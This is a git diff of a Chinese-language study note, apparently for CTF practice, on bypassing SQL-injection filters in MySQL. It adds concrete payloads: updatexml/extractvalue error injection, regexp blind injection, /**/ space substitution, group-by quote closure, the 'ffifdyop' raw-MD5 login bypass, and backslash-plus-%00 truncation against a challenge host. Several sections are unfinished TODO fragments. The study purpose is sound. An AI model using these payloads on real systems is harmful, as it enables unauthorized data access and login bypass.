@@ -1200,10 +1200,10 @@ ERROR 1105 (HY000): XPATH syntax error: '~security'
 >
 > - `substring()`
 >
->   只能使用`substring()`分批次获取：？？？？？？？？？？TODO：？？？
+>   只能使用`substring()`、`substr()`、`left()`、`right()`、`regexp()`等函数分批次获取：？？？？？？？？？？TODO：？？？
 >
 >   ```
->     
+>           
 >   ```
 >
 >   
@@ -1470,21 +1470,21 @@ Runtime error: integer overflow
 >   +-------------------------+
 >   |     9223372036854776000 |
 >   +-------------------------+
->   
+>         
 >   mysql> select abs(0x8000000000000000);
 >   +-------------------------+
 >   | abs(0x8000000000000000) |
 >   +-------------------------+
 >   |     9223372036854776000 |
 >   +-------------------------+
->   
+>         
 >   mysql> select abs(0x7fffffffffffffff + 1);
 >   +-----------------------------+
 >   | abs(0x7fffffffffffffff + 1) |
 >   +-----------------------------+
 >   |         9223372036854776000 |
 >   +-----------------------------+
->   
+>         
 >   mysql> select abs(0xFFFFFFFFFFFFFFFF);
 >   +-------------------------+
 >   | abs(0xFFFFFFFFFFFFFFFF) |
@@ -1864,7 +1864,7 @@ Query OK, 0 rows affected (0.00 sec)
 
 不幸的是，`LIMIT`子句没有`LIMIT(1)`、`LIMIT(0),(1)`、`LIMIT(0,1)`之类的绕过方法，必须带空格。所以无法通过`LIMIT`指定输出哪一行的数据
 
-`left()`与`right()`会在数据库有多行时返回多行，需要用`group_concat()`变成一行，才能
+`left()`与`right()`会在数据库有多行时返回多行，需要用`group_concat()`变成一行，才能？？？？
 
 爆数据库名：
 
@@ -1884,6 +1884,8 @@ Query OK, 0 rows affected (0.00 sec)
 ?id=1'^extractvalue(0x0a,concat(0x0a,(select(group_concat(column_name))from(information_schema.columns)where((table_name)like('表名')))))%23
 ```
 
+或者TODO：？？？？？？？`select/**/*/**/from/**/users`
+
 ## §4.3 盲注绕`>`、`<`、`=`
 
 `ifnull(a,b)`：return a != NULL ? a : b
@@ -1900,9 +1902,155 @@ Query OK, 0 rows affected (0.00 sec)
 
 使用字符串拼接运算符`||`
 
+？？？？？？？？？？？？？？？？
+
+```
+mysql> SELECT * from users where id regexp('1');
++----+----------+----------+
+| id | username | password |
++----+----------+----------+
+|  1 | Dumb     | 123      |
+| 10 | admin2   | 123      |
+| 11 | admin3   | 123      |
+| 12 | dhakkan  | 123      |
+| 14 | admin4   | 123      |
++----+----------+----------+
+5 rows in set (0.00 sec)
+
+mysql> SELECT * from users where id regexp('1') && username regexp('^a');
++----+----------+----------+
+| id | username | password |
++----+----------+----------+
+| 10 | admin2   | 123      |
+| 11 | admin3   | 123      |
+| 14 | admin4   | 123      |
++----+----------+----------+
+
+&&(column_name)regexp('^r')绕空格
+注意是绕报错注入的30字符限制
+(updatexml(1,concat(0x3a,(select(group_concat(column_name))from(information_schema.columns)where(table_name='users')&&(column_name)regexp('^r'))),1))#
+```
 
 
-## §4.5 合成字符
+
+## §4.5 内联注释绕空格
+
+`select * from users`与`select/**/*/**/from/**/users`的效果一样，只是把空格换成了`/**/`而已。
 
 
+
+## §4.6 合成字符
+
+## §4.7 绕过注释符
+
+考虑以下语句：`select * from users where id='$id' limit 0,1`，禁用所有注释符。
+
+可以考虑Payload为`1' group by 2,'`，得到的SQL语句为`select * from users where id='1' group by 2,'' limit 0,1`。这里不用`order by`爆列数的原因是`group by`支持多参数，可以闭合最后的单引号。
+
+## §4.8 绕过`information_schema`爆列名
+
+使用`mysql`数据库的`innodb_index_stats`和 `innodb_table_stats`两张表。
+
+https://dba.stackexchange.com/questions/54608/innodb-error-table-mysql-innodb-table-stats-not-found-after-upgrade-to-mys
+
+？？？？？？找不到这张表TODO：？？？？？？？？
+
+https://www.cnblogs.com/upfine/p/16496021.html
+
+# §5 PHP与SQL的综合Bypass
+
+## §5.1 PHP的`md5()`
+
+[PHP官方文档](https://www.php.net/manual/en/function.md5.php)对`md5()`的定义如下：
+
+> `md5(string $string, bool $binary = false): string`
+>
+> - string
+>
+>   待加密的字符串
+>
+> - binary
+>
+>   可选。为`true`时返回16字节的二进制形式。
+
+审计以下代码：
+
+```php
+$username = addslashes(......)
+$password = md5(......,true);
+$sql = "select * from users where username='$username' and password='$password'";
+```
+
+当`md5(...)`的前五个字节恰好符合正则表达式`\‘or\'[1-9]`，且后面的11个字节没有`'`时，拼接形成的SQL语句为`select * from users where username='...' and password=''or'???????????'`。
+
+SQL在将字符串作为布尔值进行处理时，会尝试将前几个数字字符转化为整数（如果第一个字符不是数字，则会被当作`false`，并生成一个`Truncated incorrect INTEGER value: '...'`的警告）。转化为整数后，如果其为0，则被当作`false`，并生成一个`Truncated incorrect INTEGER value: '...'`的警告，反之为`true`：
+
+```mysql
+mysql> select * from users where password=''or'1abc';
+......
+13 rows in set, 1 warning (0.00 sec)
+
+mysql> select * from users where password=''or'0abc';
+Empty set, 1 warning (0.00 sec)
+
+mysql> select * from users where password=''or'000abc';
+Empty set, 1 warning (0.00 sec)
+
+mysql> select * from users where password=''or'001abc';
+......
+13 rows in set, 1 warning (0.00 sec)
+```
+
+经过穷举，`ffifdyop`的MD5值恰好满足以上所有条件，可以绕过登录系统的密码校验。
+
+```php
+$md5 = md5("ffifdyop",true); # 'or'6É].é!r,ùíb.
+$sql = "select * from `admin` where password='$md5'";
+echo $sql;
+```
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+过滤单引号时闭合单引号：`select * from users where username='123' and passwd='123'`，让`username=\`使后面的`'`被转义，再由`passwd=...;`即可闭合单引号：
+
+```python
+URL_PREFIX = "http://703919f8-2d7e-4009-83cf-425433e65a3d.node4.buuoj.cn:81"
+print(SQL_TEMPLATE.format('\\','||/**/passwd/**/regexp/**/"^a";%00'))
+	# select * from users where username='\' and passwd='||/**/passwd/**/regexp/**/"^a";%00'
+```
+
+
+
+
+
+SQL`%00`会认为这为当前命令结尾，可以截断字符串。`....;%00....`，可代替注释符
+
+
+
+Python处理特殊字符时会自动URL编码，例如：
+
+```python
+data = "%00" # ×
+data = chr(0) # √
+```
 
